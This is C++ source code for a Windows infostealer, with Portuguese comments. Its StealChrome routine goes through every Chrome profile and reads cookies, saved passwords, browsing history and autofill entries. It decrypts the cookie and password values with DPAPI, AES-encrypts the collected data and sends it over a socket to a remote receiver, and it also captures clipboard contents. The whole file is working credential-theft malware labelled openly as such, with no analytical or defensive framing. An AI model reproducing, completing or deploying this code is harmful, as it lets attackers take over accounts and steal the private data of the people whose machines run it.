#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <vector>
#include <thread>
#include <sstream>
#include <fstream>
#include <string>
#include "crypt.h"

#pragma comment(lib, "crypt32.lib")

std::string ReplaceAll(std::string str, const std::string& from, const std::string& to){
    size_t start_pos = 0;
    while((start_pos = str.find(from, start_pos)) != std::string::npos){
        str.replace(start_pos, from.length(), to);
        start_pos += to.length();
    }
    return str;
}

// DPAPI Decrypt (Chrome blob)
std::string DPAPIDecrypt(const std::vector<BYTE>& data){
    DATA_BLOB DataIn, DataOut;
    DataIn.pbData = (BYTE*)data.data();
    DataIn.cbData = data.size();
    if(CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)){
        std::string out((char*)DataOut.pbData, DataOut.cbData);
        LocalFree(DataOut.pbData);
        return out;
    }
    return "";
}

// Perfis do Chrome: Default + outros
std::vector<std::string> GetChromeProfiles(){
    char path[MAX_PATH];
    SHGetFolderPathA(NULL,CSIDL_LOCAL_APPDATA, NULL,0,path);
    std::vector<std::string> profiles;
    std::string dir = std::string(path) + "\\Google\\Chrome\\User Data\\";
    WIN32_FIND_DATAA fData;
    HANDLE hFind = FindFirstFileA((dir + "*").c_str(), &fData);
    if (hFind!=INVALID_HANDLE_VALUE){
        do{
            if((fData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
              strcmp(fData.cFileName, ".") && strcmp(fData.cFileName, ".."))
                profiles.push_back(dir + fData.cFileName);
        } while(FindNextFileA(hFind,&fData));
        FindClose(hFind);
    }
    profiles.push_back(dir + "Default");
    return profiles;
}

// Envia cookies, senhas, history, autofill do Chrome (todos perfis)
void StealChrome(SOCKET sock, std::string mode = "all"){
    auto profiles = GetChromeProfiles();
    for(const auto& profile : profiles){
        // COOKIES
        std::string cookiesFile = profile + "\\Cookies";
        sqlite3* db = nullptr;
        if(sqlite3_open(cookiesFile.c_str(), &db)==SQLITE_OK){
            sqlite3_stmt* stmt = nullptr;
            sqlite3_prepare_v2(db, "SELECT host_key,name,encrypted_value FROM cookies", -1, &stmt, nullptr);
            std::ostringstream sendout;
            sendout << "{ \"profile\": \"" << profile << "\", \"cookies\": [";
            bool first = true;
            while(sqlite3_step(stmt)==SQLITE_ROW){
                std::string host = (const char*)sqlite3_column_text(stmt,0);
                std::string name = (const char*)sqlite3_column_text(stmt,1);
                int len = sqlite3_column_bytes(stmt,2);
                const BYTE* val = (const BYTE*)sqlite3_column_blob(stmt,2);
                std::vector<BYTE> enc(val, val+len);
                std::string dec = DPAPIDecrypt(enc);
                if(!first) sendout << ",";
                sendout << "{\"host\":\""<<host<<"\",\"name\":\""<<name<<"\",\"val\":\""<<ReplaceAll(dec,"\"","\\\"")<<"\"}";
                first=false;
            }
            sendout << "] }";
            std::string json = sendout.str();
            auto crypted = EncryptAES((BYTE*)json.data(), json.size());
            send(sock,(char*)crypted.data(),crypted.size(),0);
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            Sleep(250);
        }
        // SENHAS
        std::string loginFile = profile + "\\Login Data";
        if(sqlite3_open(loginFile.c_str(), &db)==SQLITE_OK){
            sqlite3_stmt* stmt = nullptr;
            sqlite3_prepare_v2(db, "SELECT origin_url,username_value,password_value FROM logins", -1, &stmt, nullptr);
            std::ostringstream sendout;
            sendout << "{ \"profile\": \"" << profile << "\", \"logins\": [";
            bool first = true;
            while(sqlite3_step(stmt)==SQLITE_ROW){
                std::string url = (const char*)sqlite3_column_text(stmt,0);
                std::string user = (const char*)sqlite3_column_text(stmt,1);
                int len = sqlite3_column_bytes(stmt,2);
                const BYTE* val = (const BYTE*)sqlite3_column_blob(stmt,2);
                std::vector<BYTE> enc(val, val+len);
                std::string dec = DPAPIDecrypt(enc);
                if(!first) sendout << ",";
                sendout << "{\"url\":\""<<ReplaceAll(url,"\"","\\\"")<<"\",\"user\":\""<<ReplaceAll(user,"\"","\\\"")<<"\",\"pass\":\""<<ReplaceAll(dec,"\"","\\\"")<<"\"}";
                first=false;
            }
            sendout << "] }";
            std::string json = sendout.str();
            auto crypted = EncryptAES((BYTE*)json.data(), json.size());
            send(sock,(char*)crypted.data(),crypted.size(),0);
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            Sleep(250);
        }
        // HISTORY
        std::string histFile = profile + "\\History";
        if(sqlite3_open(histFile.c_str(), &db)==SQLITE_OK){
            sqlite3_stmt* stmt = nullptr;
            sqlite3_prepare_v2(db, "SELECT url,title,last_visit_time FROM urls WHERE last_visit_time>0", -1, &stmt, nullptr);
            std::ostringstream sendout;
            sendout << "{ \"profile\": \"" << profile << "\", \"history\": [";
            bool first = true;
            int count = 0;
            while(sqlite3_step(stmt)==SQLITE_ROW){
                std::string url = (const char*)sqlite3_column_text(stmt,0);
                std::string title = (const char*)sqlite3_column_text(stmt,1);
                long long ts = sqlite3_column_int64(stmt,2);
                if(!first) sendout << ",";
                sendout << "{\"url\":\""<<ReplaceAll(url,"\"","\\\"")<<"\",\"title\":\""<<ReplaceAll(title,"\"","\\\"")<<"\",\"time\":"<<ts<<"}";
                first=false; count++;
                if(count>100){break;}
            }
            sendout << "] }";
            std::string json = sendout.str();
            auto crypted = EncryptAES((BYTE*)json.data(), json.size());
            send(sock,(char*)crypted.data(),crypted.size(),0);
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            Sleep(250);
        }
        // AUTOFILLS
        std::string autofillFile = profile + "\\Web Data";
        if(sqlite3_open(autofillFile.c_str(), &db)==SQLITE_OK){
            sqlite3_stmt* stmt = nullptr;
            sqlite3_prepare_v2(db, "SELECT name,value FROM autofill", -1, &stmt, nullptr);
            std::ostringstream sendout;
            sendout << "{ \"profile\": \"" << profile << "\", \"autofill\": [";
            bool first = true;
            while(sqlite3_step(stmt)==SQLITE_ROW){
                std::string name = (const char*)sqlite3_column_text(stmt,0);
                std::string value = (const char*)sqlite3_column_text(stmt,1);
                if(!first) sendout << ",";
                sendout << "{\"name\":\""<<ReplaceAll(name,"\"","\\\"")<<"\",\"value\":\""<<ReplaceAll(value,"\"","\\\"")<<"\"}";
                first=false;
            }
            sendout << "] }";
            std::string json = sendout.str();
            auto crypted = EncryptAES((BYTE*)json.data(), json.size());
            send(sock,(char*)crypted.data(),crypted.size(),0);
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            Sleep(250);
        }
        // CLIPBOARD STEAL (extra)
        if(OpenClipboard(NULL)){
            HANDLE hData = GetClipboardData(CF_TEXT);
            if(hData){
                char* clip = (char*)GlobalLock(hData);
                if(clip){
                    std::string content(clip,strlen(clip));
                    std::string json = "{\"profile\":\""+profile+"\",\"clipboard\":\""+ReplaceAll(content,"\"","\\\"")+"\"}";
                    auto crypted = EncryptAES((BYTE*)json.data(), json.size());
                    send(sock,(char*)crypted.data(),crypted.size(),0);
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
            Sleep(250);
        }
    }
}